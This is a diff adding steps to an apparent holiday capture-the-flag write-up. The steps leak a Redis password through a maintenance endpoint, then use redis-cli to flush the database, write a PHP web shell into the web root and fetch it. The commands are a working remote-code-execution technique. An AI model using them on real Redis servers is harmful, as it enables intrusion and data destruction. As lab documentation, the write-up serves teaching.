@@ -663,6 +663,28 @@ Brake  080 Contains __ __ __ FF __ __
 * Location: Kitchen
 * [Conversation: Holly Evergreen](conversations.md#holly-evergreen)
 
+First, use the maint cmd "CONFIG GET \*" to get the password
+
+```bash
+curl http://localhost/maintenance.php?cmd=config,get,*
+```
+
+Then use that password to use a much easier shell to grab the contents of index.php
+
+```bash
+redis-cli --raw -a 'R3disp@ss'
+
+flushall
+
+config set dir /var/www/html/
+config set dbfilename test.php
+set test "<?php $out = shell_exec('ls -la; cat /var/www/html/index.php'); echo $out; ?>"
+save
+exit
+
+curl -o- http://localhost/test.php
+```
+
 
 ## Greeting Cards
 * Location: Talks Lobby
